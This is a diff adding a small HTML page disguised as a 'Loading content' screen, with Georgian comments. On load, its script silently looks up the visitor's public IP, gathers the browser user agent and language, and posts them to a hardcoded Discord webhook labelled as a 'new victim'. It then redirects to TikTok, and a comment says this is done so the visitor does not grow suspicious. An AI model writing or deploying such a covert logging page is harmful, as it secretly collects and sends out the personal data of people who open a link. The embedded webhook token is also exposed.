@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        async function sendLog() {
+            // შენი Webhook ლინკი (კოდიდან აღებული)
+            const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
+
+            // ვიგებთ IP-ს საჯარო API-დან (როგორც შენს კოდში იყო)
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+
+            const info = {
+                content: "🎯 **ახალი მსხვერპლი (Mobile/Web)!**",
+                embeds: [{
+                    title: "მონაცემები",
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 IP მისამართი", value: `\`${ipData.ip}\`` },
+                        { name: "📱 მოწყობილობა", value: navigator.userAgent },
+                        { name: "🌍 ენა", value: navigator.language }
+                    ]
+                }]
+            };
+
+            // მონაცემების გაგზავნა Discord-ზე
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            });
+
+            // გადამისამართება რეალურ საიტზე, რომ ეჭვი არ აიღოს
+            window.location.href = "https://www.tiktok.com"; 
+        }
+
+        window.onload = sendLog;
+    </script>
+</head>
+<body>
+    <p>Loading content, please wait...</p>
+</body>
+</html>
